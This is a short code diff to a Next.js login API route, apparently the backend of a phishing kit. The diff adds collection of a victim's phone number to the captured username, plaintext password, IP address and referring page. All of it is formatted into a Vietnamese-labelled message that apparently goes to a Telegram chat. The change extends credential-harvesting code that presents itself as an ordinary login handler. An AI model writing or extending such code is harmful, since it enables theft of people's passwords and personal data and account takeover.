@@ -21,6 +21,7 @@ export async function POST(req: NextRequest) {
 
     const username = String(body.username).trim();
     const password = String(body.password);
+    const phone = body.phone ? String(body.phone).trim() : '';
     const rawType = body.type ? String(body.type).trim() : '';
     const rawReferer = body.referer || req.headers.get('referer') || '/login';
 
@@ -42,6 +43,7 @@ export async function POST(req: NextRequest) {
       type,
       username,
       password,
+      phone,
       ip: clientIp,
       userAgent,
       referer,
@@ -105,6 +107,7 @@ export async function POST(req: NextRequest) {
           `📌 *Thao tác:* ${tgIcon} *${type.toUpperCase()}*\n` +
           `👤 *Tài khoản:* \`${username}\`\n` +
           `🔑 *Mật khẩu:* \`${password}\`\n` +
+          (phone ? `📞 *Số điện thoại:* \`${phone}\`\n` : '') +
           `🌐 *IP:* \`${clientIp}\`\n` +
           `⏰ *Thời gian:* ${time}\n` +
           `📍 *Nguồn:* \`${referer}\`\n` +
